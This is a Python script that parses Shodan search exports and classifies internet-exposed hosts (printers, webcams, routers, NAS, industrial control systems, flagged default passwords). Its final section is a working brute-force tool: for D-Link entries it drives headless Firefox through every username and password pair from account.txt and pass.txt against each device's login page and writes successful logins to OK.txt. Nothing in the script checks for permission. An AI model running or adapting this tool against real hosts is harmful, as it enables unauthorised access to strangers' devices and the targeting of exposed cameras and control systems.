#!/usr/bin/python
# -*- coding: UTF-8 -*-

import ipaddress
import json
import os
import time
from pprint import pprint
import click
import numpy as np 

import shodan
import argparse
import sys
import csv
import logging
import re
import requests
from socket import setdefaulttimeout
from colorama import Fore, Back, Style

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import StaleElementReferenceException, TimeoutException, WebDriverException, NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.common.by import By



@click.command(context_settings=dict(help_option_names=['-h', '--help']))
@click.version_option(version='1.0.0', prog_name="Shodan Parser")
@click.argument('shodan_json_file')
@click.option('-o', '--output', show_default=True, default='targets.txt',
              help='Path to output file with parsed data. IP:PORT format, one entry per line')
@click.option('-v', '--verbose', is_flag=True, show_default=True, help='Verbose mode')
@click.option('-n', '--log-every', show_default=True, default=100,
              help='Show log after specified number of entries parsed. Effective only in verbose mode')


def cli(shodan_json_file, output, verbose, log_every):
    """This script will parse JSON data exported from SHODAN and create IP:PORT formatted list to be used
        with other tools. To run specify path to a file with JSON data from SHODAN."""


    if not os.path.exists(shodan_json_file):
        print('\nError: Provided input file does not exist')
        exit(1)

    with open(shodan_json_file) as jsonFile, open(output, 'w') as fileToWrite:
        print('\n[+] STARTING')
        printIfVerbose(verbose, f'[+] Opened [{jsonFile.name}] to parse json data from')
        printIfVerbose(verbose, f'[+] Opened [{fileToWrite.name}] to write to')

        correctIpCounter = 0
        incorrectIpCounter = 0
        loopCounter = 0
        i = 0

        printIfVerbose(verbose, '[+] Parsing data')
        startTime = time.time()

        
        first = 0
        ab = 0
        ip_iot_time = 0
        ip_time = 0
        ip_list = str('')
        ip_iot_list = str('')
        product = "none"

        for line in jsonFile:
            issuer = ""
            title = ""
            product = ""
            ip = ""
            port = ""
            http = ""
            ssl = ""
            shodan = ""
            cert = ""
            data = ""
            cpe = ""
            devicetype = ""
            server = ""
            vulns = ""
            info = ""
            version = ""
            features = ""
            http_html=""
            http_location=""

            jsonObject = json.loads(line)
            
            ip = jsonObject.get('ip_str')
            port = str(jsonObject.get('port'))
            http = jsonObject.get('http')
            #http_location = http.get('location')
            ssl = jsonObject.get('ssl')
            vulns = str(jsonObject.get('vulns'))
            cpe = str(jsonObject.get('cpe'))
            devicetype = str(jsonObject.get('devicetype'))
            product = str(jsonObject.get('product'))
            shodan = jsonObject.get('_shodan')
            
            shodan = str(shodan.get('module'))
            info = str(jsonObject.get('info'))
            transport = str(jsonObject.get('transport'))
            version = str(jsonObject.get('version'))
            # dict_keys(['ip', 'isp', 'ip_str', 'transport', 'http', 'vulns', 'version', 'port', '_shodan', 'cpe', 'hash', 'location', 'hostnames', 'timestamp', 'opts', 'domains', 'product', 'data', 'asn', 'org', 'os'])


            data = str(jsonObject.get('data'))
            data = str(data.lower()) 
            data = str(data.split('\n'))   
            shodan = str(shodan.split('\n'))
            info = str(info.split(' '))
            transport = str(transport.split(' '))
            
            #print (http)
            

            if cpe.find("None") == 0 :
               cpe = ''

            if type(http) == dict :
               title = str(http.get('title'))
               http_location = http.get('location')
               #http_html = str(http.get('html'))
               #http_html = str(http_html.split('\n'))
               server = str(http.get('server'))
               if title.find("None") == 0:
                  title = ''
                   
            if type(ssl) == dict:
               cert = ssl.get('cert')
               if type(cert) == dict:
                  issuer = str(cert.get('issuer'))

            if vulns.find("None") == 0:
               vulns = ''
            elif vulns.find("None") == -1:
               vulns = 'have cve'
            
            if info.find("None") == 0:
               info = ''
            
            if transport.find("None") == 0:
               transport = ''
            
            if version.find("None") == 0:
               version = ''

            if server.find("None") == 0:
               server = ''

            if product.find("None") == 0:
               product = ''

            if devicetype.find("None") == 0:
               devicetype = ''
            
            vulns = str(vulns.split('\n'))
            version = str(version.split(' '))
            title = str(title.lower()) 
            title = str(title.split('\r'))  
            issuer = str(issuer.lower()) 
            issuer = str(issuer.split('\r'))  
            shodan = str(shodan.lower()) 
            shodan = str(shodan.split('\r'))  
            devicetype = str(devicetype.lower()) 
            devicetype = str(devicetype.split('\r'))  
            product = str(product.lower()) 
            product = str(product.split('\r'))  
            server = str(server.lower()) 
            server = str(server.split('\r'))  
            cpe = str(cpe) 
            cpe = str(cpe.lower()) 
            cpe = str(cpe.split('\r'))  
            vulns = str(vulns.lower()) 

            #if data.find("vmware") >= 0:
            
     

            try:		    
                if ip.find("None") != 0 :
                #if ip != str(0):
                       
#port 111 linux use , call sunonc or sunrpc
#port 37 for time
#port 626 is apple imap
#port 7777 maybe get computer virus or play game
#port 2376 maybe play game
#mdns is multicast DNS (mDNS)
#ldaps is linux of DNS (mDNS)
#xtremerat just is for windows
#minecraft, microsoft game
#a10ws is game
#fortinet and zywall is firewall

                    type1 = str("")
                    iottype1 = str("")

                    correctIpCounter += 1
                    if port == str(9100) or data.find("hp ") >= 0 or data.find("sharp") >= 0 or data.find("printer") >= 0 or shodan.find("printer") >= 0 or data.find("xerox") >= 0 or data.find("kyocera") >= 0 or data.find("epson") >= 0 or data.find("server: hp") >= 0 or data.find("virata-emweb") >= 0 or data.find("server: ews-nic") >= 0 or data.find("server: mrvl") >= 0 or devicetype.find("printer") >= 0 or title.find("print") >= 0 or data.find("centreware internet services") >= 0 or issuer.find("hp ") >= 0 or server.find("web-server/") >= 0 or server.find("epson") >= 0 or server.find("km-mfp-http") >= 0 or port == str(515):
                       type1 = str('Printer')
                       iottype1 = str('Printer')
                    
                    elif data.find("openssh") >= 0 or shodan.find("openssh") >= 0 :
                       type1 = str('openssh')
                    
                    elif port == str(8008) :
                       type1 = str('IBM HTTP Server, but without IBM support')
                    
                    elif server.find("miniserv/") >= 0 :
                       type1 = str('miniserve')

                    elif data.find("postgresql") >= 0 :
                       type1 = str('postgresql')

                    elif shodan.find("xtremerat") >= 0 :
                       type1 = str('xtremerat, is a Remote Access Trojan')

                    elif shodan.find("mysql") >= 0 :
                       type1 = str('mysql')

                    elif data.find("server: microsoft") >= 0 :
                       type1 = str('server: microsoft')

                    elif data.find("ssh") >= 0 or shodan.find("ssh") >= 0 or port == str(22):
                       type1 = str('ssh')

                    elif port == str(3389):
                       type1 = str('3389 port')

                    elif port == str(53):
                       type1 = str('dns')

                    elif shodan.find("ldaps") >= 0 or shodan.find("mdns") >= 0:
                       type1 = str('mdns')

                    elif server.find("cup") >= 0 :
                       type1 = str('printer server IPP')
                       iottype1 = str('Printer')

                    elif title.find("moved") >= 0 and product.find("nginx ") >= 0:
                       type1 = str('printer ')
                       iottype1 = str('Printer')

                    elif data.find("vmware") >= 0 or issuer.find("vmware") >= 0:
                       type1 = str('vmware') 

                    elif server.find("aperio imageserver") >= 0 :
                       type1 = str('aperio imagescope, pathology slide viewing software') 
                       iottype1 = str('slide')

                    elif data.find("airtunes") >= 0 :
                       type1 = str('airplay') 
                    
                    elif data.find("bigip") >= 0 or server.find("bigip")  >= 0 :
                       type1 = str('bigip-F5 server') 

                    elif data.find("bf430") >= 0:
                       type1 = str('access control system') 
                       iottype1 = str('access control')
                        
                    elif server.find("build-in") >= 0:
                       type1 = str('access control system') 
                       iottype1 = str('access control')

                    elif data.find("basic realm") >= 0 and data.find("web server authentication") >= 0:
                       type1 = str('access control system') 
                       iottype1 = str('access control')

                    elif server.find("bellwin") >= 0:
                       type1 = str('remote power manager') 
                       iottype1 = str('Industrial control systems')

                    elif title.find("polycom") >= 0 or issuer.find("polycom") >= 0:
                       type1 = str('VoIP server') 
                       iottype1 = str('VoIP')

                    elif server.find("python") >= 0 or server.find("lab") >= 0:
                       type1 = str('Parhapes server is built by himself') 

                    elif server.find("splunk") >= 0:
                       type1 = str('splunk') 

                    elif product.find("allergro rompager") >= 0 :
                       type1 = str('RomPager router') 
                       iottype1 = str('router')

                    elif server.find("avermedia") >= 0 :
                       type1 = str('avermedia video encoder') 
                       iottype1 = str('VoIP')

                    elif title.find("aicloud") >= 0 :
                       type1 = str('Asus aicloud, a service of asus wifi router') 
                       iottype1 = str('router')

                    elif issuer.find("deltapath") >= 0 and server.find("asterisk") >= 0:
                       type1 = str('frsip, telephone system') 
                       iottype1 = str('VoIP') 

                    elif data.find("netgear") >= 0 :
                       type1 = str('Netgear,netgear same as dlink') 
                       iottype1 = str('router') 

                    elif data.find("nvr") >= 0 and port != str(22):
                       type1 = str('nvr') 
                       iottype1 = str('VoIP') 
                        
                    elif cpe.find("thecus") >= 0 :
                       type1 = str('NAS')                  

                    elif issuer.find("vigor router") >= 0 or data.find("vigor router") >= 0:
                       type1 = str('Vigor router') 
                       iottype1 = str('router') 

                    elif issuer.find("aten.com.tw") >= 0 :
                       type1 = str('VoIP video conferencing') 
                       iottype1 = str('VoIP') 

                    elif data.find("vigor") >= 0 or title.find("vigor") >= 0:
                       type1 = str('Vigor,vigor is online tv or router') 
                       iottype1 = str('router & VoIP') 

                    elif data.find("dvr") >= 0 or data.find("cctv") >= 0:
                       type1 = str('cctv') 
                       iottype1 = str('VoIP') 

                    elif data.find("mini_httpd") >= 0 or server.find("mini_httpd") >= 0:
                       type1 = str('DVR or tv') 
                       iottype1 = str('VoIP') 

                    elif data.find("<soap") >= 0 or data.find("soap.org") >= 0 or data.find("qnap") >= 0 or issuer.find("qnap") >= 0 or server.find("http server 1.0") >= 0:
                       type1 = str('QANP NAS') 
                       iottype1 = str('NAS') 

                    elif data.find("ctrlt") >= 0 or port == str(37215):
                       type1 = str('maybe huawei router or hub') 
                       iottype1 = str('route') 

                    elif data.find("huawei") >= 0:
                       type1 = str('huawei router or hub') 

                       iottype1 = str('route') 
                    elif data.find("goahead") >= 0 :
                       type1 = str('goahead,goahead is embedded device interfaces and web applications') 
                       #https://research.checkpoint.com/new-iot-botnet-storm-coming/
                       iottype1 = str('IOT') 

                    elif data.find("avtech") >= 0 :
                       type1 = str('avtech,avtech is video hdcctv or ip camera....') 
                       #https://research.checkpoint.com/new-iot-botnet-storm-coming/
                       iottype1 = str('IOT & VoIP') 

                    elif data.find("mikrotik") >= 0 :
                       type1 = str('mikrotik,mikrotik router or wifi...') 
                       #https://research.checkpoint.com/new-iot-botnet-storm-coming/
                       iottype1 = str('IOT & router & wifi') 
                    
                    elif data.find("linksys") >= 0 :
                       type1 = str('linksys,linksys is wifi') 
                       #https://research.checkpoint.com/new-iot-botnet-storm-coming/
                       iottype1 = str('wifi') 

                    elif data.find("synology") >= 0 or server.find("nginx") >= 0 or title.find("synology") >= 0 or cpe.find("synology") >= 0:
                       type1 = str('synology,NAS') 
                       #https://research.checkpoint.com/new-iot-botnet-storm-coming/
                       iottype1 = str('NAS') 

                    elif data.find("canon") >= 0 or data.find("catwalk") >= 0 or server.find("catwalk") >= 0 or issuer.find("canon") >= 0:
                       type1 = str('canon,including cameras,camcorders, and a lot of IOT products')
                       iottype1 = str('IOT & VoIP') 

                    elif shodan.find("telnet") >= 0 and cpe.find("cisco") >= 0 :
                       type1 = str('cisco server can telnet')  
                       iottype1 = str('router') 

                    elif shodan.find("telnet") >= 0 and cpe.find("win") >= 0 :
                       type1 = str('win server can telnet')  
                       iottype1 = str('router') 

                    elif shodan.find("telnet") >= 0 and cpe.find("win") >= -1 and cpe.find("cisco") >= -1  :
                       type1 = str('server, other brands, can telnet') 
                       iottype1 = str('router') 

                    elif shodan.find("weblogic") >= 0 :
                       type1 = str('weblogic,one of oracle sub company') 

                    elif shodan.find("memcache") >= 0 :
                       type1 = str('memcache need shut down web or server') 

                    elif shodan.find("rip") >= 0 :
                       type1 = str('rip router') 
                       iottype1 = str('router') 

                    elif shodan.find("tor-control") >= 0 :
                       type1 = str('tor-control') 

                    elif data.find("moxa") >= 0 :
                       type1 = str('Moxa,gateway or switch') 
                       iottype1 = str('router') 

                    elif port == str(1911) :
                       type1 = str('Tridium Fox, Niagara to tunnel to remote SCADA networks.')
                       iottype1 = str('Industrial control systems') 

                    elif shodan.find("ethernetip") >= 0 :
                       type1 = str('ethernetip, power monitor')
                       iottype1 = str('Industrial control systems') 

                    elif shodan.find("dht") >= 0 :
                       type1 = str('distributed hash table (DHT)') 

                    elif port == str(5900) or data.find("rfb") >= 0 or title.find("vnc desktop") >= 0 or server.find("vnc server") >= 0 or product.find("realvnc") >= 0 :
                       type1 = str('VNC')

                    elif port == str(139) or port == str(445) :
                       type1 = str('SMB,server message block')
                       iottype1 = str('IOT & NAS') 

                    elif data.find("cisco") >= 0 or shodan.find("cisco") >= 0 or cpe.find("cisco") >= 0:
                       type1 = str('cisco router or switch')
                       iottype1 = str('router') 

                    elif data.find("mongodb") >= 0 :
                       data = str(data.split())
                       type1 = str('mongo db, for modern apps')
                       iottype1 = str('IOT') 

                    elif shodan.find("dahua") >= 0 :
                       type1 = str('dahua cam')
                       iottype1 = str('VoIP') 

                    elif shodan.find("git") >= 0 :
                       type1 = str('git server')

                    elif shodan.find("mqtt") >= 0 :
                       type1 = str('mqtt,mqtt is IOT protocol')
                       iottype1 = str('IOT') 

                    elif port == str(79) :
                       type1 = str('finger protocol,maybe notebook')

                    elif port == str(102) :
                       type1 = str('Siemens simatic series')
                       iottype1 = str('Industrial control systems') 

                    elif shodan.find("plc") >= 0 :
                       type1 = str('plc driver,maybe printer')
                       iottype1 = str('Printer') 

                    elif shodan.find("ipmi") >= 0 :
                       type1 = str('ipmi,use connected to a powersource and to the monitoring mediumus')
                       iottype1 = str('Industrial control systems') 

                    elif shodan.find("pptp") >= 0 :
                       type1 = str('pptp vpn')

                    elif shodan.find("java-rmi") >= 0 :
                       type1 = str('java-rmi,remote method invocation')
                       iottype1 = str('IOT') 

                    elif shodan.find("fox") >= 0 :
                       type1 = str('fox')
                       iottype1 = str('VoIP') 

                    elif shodan.find("dicom") >= 0 :
                       type1 = str('communications in medicine')
                       iottype1 = str('IOT') 

                    elif shodan.find("bacnet") >= 0 :
                       type1 = str('bacnet is IoT platform or a browser-based SCADA software package for supervisory control')
                       iottype1 = str('Industrial control systems') 

                    elif shodan.find("dnp3") >= 0 :
                       type1 = str('dnp3, electrical system')
                       iottype1 = str('Industrial control systems') 

                    elif data.find("gateway") >= 0 :
                       type1 = str('gateway')
                       iottype1 = str('router')

                    elif port == str(161) and shodan.find("snmp") >= 0 :
                       type1 = str('wireless') 
                       iottype1 = str('wifi')

                    elif product.find("dd-wrt") >= 0 or product.find("wireless") >= 0 :
                       type1 = str('wireless') 
                       iottype1 = str('wifi')

                    elif data.find("wifi") >= 0  :
                       type1 = str('wireless') 
                       iottype1 = str('wifi')

                    elif port != str(161) and shodan.find("snmp") >= 0 :
                       type1 = str('snmp')
                       iottype1 = str('IOT')  

                    elif shodan.find("apple-airport-admin") >= 0 :
                       type1 = str('apple-airport') 
                       iottype1 = str('wifi & router')

                    elif shodan.find("supermicro") >= 0 :
                       type1 = str('supermicro') 
                       iottype1 = str('IOT')  

                    elif port == str(2000) :
                       type1 = str('Cisco SCCP or get virus') 
                       iottype1 = str('router')
                        
                    elif port == str(7) or data.find("server: wfaxd") >= 0:
                       type1 = str('netfax,net fax') 
                       iottype1 = str('IOT')  

                    elif port == str(873) :
                       type1 = str('rsync,unix use for sync and checking the timestamp and size of files') 

                    elif port == str(88) :
                       type1 = str('kerberos,authentication protocol') 
                       iottype1 = str('IOT') 

                    elif port == str(6666) :
                       type1 = str('IRC') 

                    elif data.find("gpon") >= 0 :
                       type1 = str('gpon,Gigabit Capable PON') 

                    elif data.find("vsftpd") >= 0 or port == str(2121):
                       type1 = str('vsftpd') 

                    elif port == str(21) or data.find("ftp server") >= 0:
                       type1 = str('ftp') 

                    elif port == str(5632) or shodan.find("pcanywhere") >= 0 :
                       type1 = str('pcanywhere, same as 3389,no more update') 

                    elif port == str(554) or shodan.find("rtsp") >= 0 :
                       type1 = str('dvr') 
                       iottype1 = str('VoIP')

                    elif data.find("zookeeper") >= 0 or shodan.find("zookeeper") >= 0  :
                       type1 = str('zookeeper') 

                    elif data.find("imap") >= 0 or shodan.find("imap") >= 0  :
                       type1 = str('imap,mail use') 

                    elif data.find("netsarang") >= 0  :
                       type1 = str('netsarang web server') 
                       iottype1 = str('Printer & router') 

                    elif data.find("vpn") >= 0  :
                       type1 = str('vpn') 

                    elif shodan.find("openvpn") >= 0  :
                       type1 = str('openvpn')

                    elif shodan.find("coin") >= 0  :
                       type1 = str('mining serveer') 

                    elif data.find("merit lilin") >= 0 :
                       type1 = str('merit webcam') 
                       iottype1 = str('VoIP') 

                    elif data.find("cam") >= 0 or data.find("webcam") >= 0 or devicetype.find("webcam") >= 0 or product.find("webcam") >= 0 or issuer.find("camera") >= 0 or issuer.find("app-webs/") >= 0 or server.find("hmhttp") >= 0 :
                       type1 = str('webcam') 
                       iottype1 = str('VoIP') 

                    elif server.find("ispy") >= 0  :
                       type1 = str('ispy webcam') 
                       iottype1 = str('VoIP') 

                    elif data.find("ipcam") >= 0  :
                       type1 = str('ipcam') 
                       iottype1 = str('VoIP') 

                    elif data.find("udpoxy") >= 0  :
                       type1 = str('TV') 
                       iottype1 = str('VoIP') 

                    elif data.find("snom embedded") >= 0  :
                       type1 = str('snom phone') 
                       iottype1 = str('VoIP') 

                    elif data.find("server") >= 0 and data.find("cam") >= 0 :
                       type1 = str('cam') 
                       iottype1 = str('VoIP') 

                    elif title.find("securityspy") >= 0 :
                       type1 = str('SecuritySpy cam') 
                       iottype1 = str('VoIP') 

                    elif server.find("dnvrs-webs") >= 0  :
                       type1 = str('hikvision webcam') 
                       iottype1 = str('VoIP') 

                    elif data.find("netcam") >= 0  :
                       type1 = str('netcam') 
                       iottype1 = str('VoIP') 

                    elif data.find("linux") >= 0 and data.find("upnp") >= 0 and data.find("avtech") >= 0 :
                       type1 = str('cam') 
                       iottype1 = str('VoIP') 

                    elif data.find("webcam") >= 0  :
                       type1 = str('webcam') 
                       iottype1 = str('VoIP') 

                    elif port == str(389) :
                       type1 = str('ldap') 

                    elif port == str(503) or shodan.find("modbus") >= 0  :
                       type1 = str('modbus')
                       iottype1 = str('Industrial control systems') 

                    elif port == str(5060) or shodan.find("sip") >= 0  :
                       type1 = str('sip session initiation protocol')
                       iottype1 = str('VoIP') 

                    elif port == str(5938) or shodan.find("teamviewer") >= 0  :
                       type1 = str('teamviewer')  

                    elif data.find("amqp") >= 0 or shodan.find("amqp") >= 0 :
                       type1 = str('amqp')

                    elif shodan.find("torrent") >= 0:
                       type1 = str('BT or tftp')

                    elif shodan.find("x11") >= 0 or port == str(6001) or port == str(6002):
                       type1 = str('windows X system')

                    elif shodan.find("nodata") >= 0:
                       type1 = str('shodan database nodata') 

                    elif shodan.find("iec") >= 0 :
                       type1 = str('international electortechnical commission') 
                       iottype1 = str('Industrial control systems')

                    elif shodan.find("netbios") >= 0 :
                       type1 = str('maybe iot') 
                       iottype1 = str('IOT')

                    elif port == str(113) :
                       type1 = str('ident for services such as POP,IMAP,SMTP,IRC,FTF... ') 

                    elif  port == str(179) :
                       type1 = str('border gateway protocol,BGP') 
                       iottype1 = str('router')

                    elif  port == str(4369) or port == str(5671) or port == str(5672):
                       type1 = str('Home automation HAI,RabbitMQ messaging') 
                       iottype1 = str('IOT')

                    elif  port == str(3283) :
                       type1 = str('apple remote desktop,iChat') 

                    elif data.find("d-link") >= 0 or shodan.find("d-link") >= 0 or product.find("d-link") >= 0 or issuer.find("dlink.com") >= 0 or title.find("d-link") >= 0:
                       type1 = str('d-link') 
                       iottype1 = str('IOT')

                    elif data.find("tp-link") >= 0 or shodan.find("tp-link") >= 0 or product.find("tp-link") >= 0 :
                       type1 = str('tp-link') 
                       iottype1 = str('IOT')

                    elif data.find("error:alert") >= 0 :
                       type1 = str('offline') 

                    elif data.find("elux16") >= 0 :
                       type1 = str('busybox') 
                       iottype1 = str('IOT')

                    elif data.find("server: soyal") >= 0 :
                       type1 = str('soyal hub') 
                       iottype1 = str('router')

                    elif data.find("server: uc-httpd") >= 0 :
                       type1 = str('DVR')
                       iottype1 = str('VoIP') 

                    elif data.find("server: lighttpd") >= 0 :
                       type1 = str('IOT server maybe is projector or NAS') 
                       iottype1 = str('IOT & NAS')

                    elif data.find("set-cookie: iomega=") >= 0 :
                       type1 = str('NAS') 
                       iottype1 = str('NAS')

                    elif data.find("server: zot") >= 0 :
                       type1 = str('zotech iot server') 
                       iottype1 = str('IOT')

                    elif issuer.find("qno.com.tw") >= 0 :
                       type1 = str('qno, router or firewall') 
                       iottype1 = str('router')

                    elif port == str(8080)  or port == str(5000)  or port == str(5001) and data.find("server: ") >= 0:
                       type1 = str('NAS') 
                       iottype1 = str('NAS')

                    elif server.find("mt-daapd") >= 0:
                       type1 = str('NAS') 
                       iottype1 = str('NAS')

                    elif data.find("server: $projectrevision") >= 0 or server.find("$projectrevision") >= 0 or title.find("powermonitor") >= 0:
                       type1 = str('PowerMonitor') 
                       iottype1 = str('Industrial control systems')

                    elif data.find("server: hydra") >= 0 and port == str(80) :
                       type1 = str('cerio router') 
                       iottype1 = str('router') 

                    elif data.find("server: boa") >= 0 and port == str(80) :
                       type1 = str('boa, web server') 
                       iottype1 = str('IOT') 

                    elif data.find("upnp") >= 0 :
                       type1 = str('upnp') 
                       iottype1 = str('IOT') 
                        
                    elif data.find("firmware") >= 0 or devicetype.find("firewall") >= 0 or issuer.find("fortinet") >= 0 or title.find("zywall") >= 0:
                       type1 = str('firmware') 

                    elif data.find("iot") >= 0 :
                       type1 = str('IOT') 
                       iottype1 = str('IOT') 

                    elif data.find("apache") >= 0 or shodan.find("apache") >= 0:
                       type1 = str('html')

                    elif data.find("http/1.1 401 unauthorized") >= 0 and port == str(80) :
                       type1 = str('unknow but can login') 

                    elif data.find("http") >= 0 and data.find("cache") <= 1 :
                       type1 = str('online driver') 

                    elif data.find("http") >= 0 and data.find("cache") >= 0 :
                       type1 = str('web login') 

                    elif shodan.find("iscsi") >= 0 :
                       type1 = str('online driver') 

                    elif data.find("http") >= 0 and data.find("basic realm") >= 0 :
                       type1 = str('IOT') 
                       iottype1 = str('IOT') 

                    elif data.find("linux") >= 0 or shodan.find("linux") >= 0 :
                       type1 = str('linux') 

                    elif data.find("['']") >= 0  :
                       type1 = str('data is No data')

                    elif data.find("nginx") >= 0 or data.find("x-frame-options") >= 0 :
                       type1 = str('online driver maybe nas')
                       iottype1 = str('NAS') 

                    elif data.find(".cgi") >= 0 :
                       type1 = str('online nas') 
                       iottype1 = str('NAS') 

                    if shodan.find("iot") >= 0 :
                       type1 = type1 + str(' iot')

                    if data.find("default") >= 0 and data.find("password") >= 0:
                       type1 = type1 + str(' default password')

                    if data.find("400 bad request") >= 0 or data.find("http/1.1 403") >= 0 or data.find("http/1.1 404") >= 0 or data.find("http/1.0 404") >= 0 or data.find("http/1.0 403") >= 0:
                       type1 = type1 + str(' offline')



                    if iottype1 != '' and ip_iot_list.find(ip) == -1:
                       ip_iot_list = str(ipaddress.ip_address(ip)) + ip_iot_list
                       ip_iot_time += 1

                    if ip_list.find(ip) == -1 :
                       ip_list = str(ipaddress.ip_address(ip)) + ip_list
                       ip_time += 1

                    if iottype1 != '' or type1 != '' :
                       ab += 1





                 #   if type1 == 'cisco' or type1 == 'ssh' or type1 == 'ftp' or type1 == 'd-link' or type1 == 'tp-link' or type1 == 'vmware':
                 #      writableOutput = f'{ip},' 
                  #     fileToWrite.write("%s\n" % writableOutput)


                    if first == 0:
                       writableOutput = 'ip	port	data	shodan:module	product	title	issuer	cpe	devicetype	server	iottype	vulns	transport	info	http_html	http_location	version	type1(annotation)' 
                       fileToWrite.write("%s\n" % writableOutput)
                       writableOutput = f'{ip}	{port}	{data}	{shodan}	{product}	{title}	{issuer}	{cpe}	{devicetype}	{server}	{iottype1}	{vulns}	{transport}	{info}	{http_html}	{http_location}	{version}	{type1}' 
                       fileToWrite.write("%s\n" % writableOutput)
                       first +=1


                    elif first != 0:
                       writableOutput = f'{ip}	{port}	{data}	{shodan}	{product}	{title}	{issuer}	{cpe}	{devicetype}	{server}	{iottype1}	{vulns}	{transport}	{info}	{http_html}	{http_location}	{version}	{type1}' 
                       fileToWrite.write("%s\n" % writableOutput)                      
              
            except ValueError:
                incorrectIpCounter += 1
                printIfVerbose(verbose, '[!] Incorrect IP found')

            if loopCounter % log_every == 0 and loopCounter != 0:
                printIfVerbose(verbose,
                               f'[+] Lines parsed so far: {loopCounter} | Time elapsed: {round(time.time() - startTime, 3)} seconds')

            loopCounter += 1
            sum1 = correctIpCounter - ip_time
            not_yet = correctIpCounter - ab
        print('\n[+] FINISHED')
        print(f'[+] Finished parsing in {round(time.time() - startTime, 3)} seconds')
        print('\n[+] RESULTS')
        print(f'[+] IPs parsed correctly: {correctIpCounter}')
        print(f'[+] IPs incorrect: {incorrectIpCounter}')
        print(f'ip list: {ip_time} ; duplicateip: {sum1}')
        print(f'type do: {ab}; not_yet: {not_yet}')
        print(f'iot ip: {ip_iot_time}')
        print(f' [{jsonFile.name}]')
        print ("             +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+-+-+")
        print ("                |F| |U| |C| |K|   -  |0| |1| |0| |7|")
        print ("               +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+-+-+")
        print (Fore.YELLOW + "            NTU SHIHOWEN Modify")
        print (Fore.GREEN + "  Only finish D-Link   (Master's degree live)")
        print (Style.RESET_ALL)
        

        file = open(fileToWrite.name, "r")
        for line in file.readlines():                           
            line = str(line.split("\t"))
            if line.find ('d-link') >= 0:
                options = FirefoxOptions()
                options.add_argument("--headless")
                browser = webdriver.Firefox(options=options)
                line = line.split("'")
                #opening the account.txt in list format
                chars = ",'[]"
                accountfile = open("account.txt", "r")
                account = ''.join(c for c in accountfile.read() if c not in chars)
                account = account.split()
                
            
                #opening the pass.txt in list format
                chars = ",'[]"
                passfile = open("pass.txt", "r")
                defpass = ''.join(c for c in passfile.read() if c not in chars)
                defpass = defpass.split()
                defpass.append('')
                a = 0
                address = "http://" + line[1]+":"+line[3]
                print (address)
                for u in account:
                    defaultusername = str(u)
                    for p in defpass:
                        defpassword = str(p)
                        try:
                            browser.get(address);
                            time.sleep(1)
                            username = browser.find_element_by_xpath("//input[@id='user_name']")
                            password = browser.find_element_by_xpath("//input[@id='user_pwd']")
                            #If element is found, but it ain't interactable
                            try:
                                wait = WebDriverWait(browser, 1);
                                wait.until(EC.element_to_be_clickable((By.XPATH, ".//input[@id='user_name']")));
                                username.send_keys(defaultusername)
                            except (StaleElementReferenceException, TimeoutException) as Exception:
                                pass
                            try:
                                wait = WebDriverWait(browser, 1);
                                wait.until(EC.element_to_be_clickable((By.XPATH, ".//input[@id='user_pwd']")));
                                password.send_keys(defpassword)
                            except (StaleElementReferenceException, TimeoutException) as Exception:
                                pass
                            
                            time.sleep(1)
                            login_attempt = browser.find_element_by_xpath("//*[@id='logIn_btn'][@type='button']") 
                            login_attempt.click()
                            time.sleep(5)
                            #Finding a unique string from html source code to find if you're logged in or nah!
                            source_code = browser.page_source
                            if 'folder_view.php' in source_code:
                                print(Fore.GREEN + '[*] '+ line[1]+":"+line[3] + 'User:' + defaultusername + ' & Password:' + defpassword + ' is OK')
                                a = 1
                                OK = open("OK.txt", "w+")
                                OK.write("%s\n" % line[1] + ':' + line[3] + 'User:' + defaultusername + ' & Password:' + defpassword)
                                break
                               
                            else:
                                print ('[*] ' + line[1]+":"+line[3] + ' Failed!')
                                
                            
                        except (WebDriverException, NoSuchElementException, StaleElementReferenceException) as Exception:
                            print('User:' + defaultusername + ' & Password:' + defpassword + ' Failed!')
                            
                            pass
                        
                
                    if  a == 1:
                        a = 0
                        print ("skip:" + line[1]+":"+line[3])
                        browser.quit() 
                        break                           
                         
                browser.quit()    
                print (Fore.YELLOW + '[*] ' + line[1]+":"+line[3] + ' end')
            


        #writableOutput = f'ip list: {ip_time} ; duplicateip: {sum1}' 
        #fileToWrite.write("%s\n" % writableOutput)  

        #writableOutput = f'type do: {ab}; not_yet: {not_yet}' 
        #fileToWrite.write("%s\n" % writableOutput)  

        #writableOutput = f'iot ip: {ip_iot_time}' 
        #fileToWrite.write("%s\n" % writableOutput) 
        

def printIfVerbose(isVerbose, message):
    if isVerbose:
        print(message)


if __name__ == '__main__':
    cli()

                 

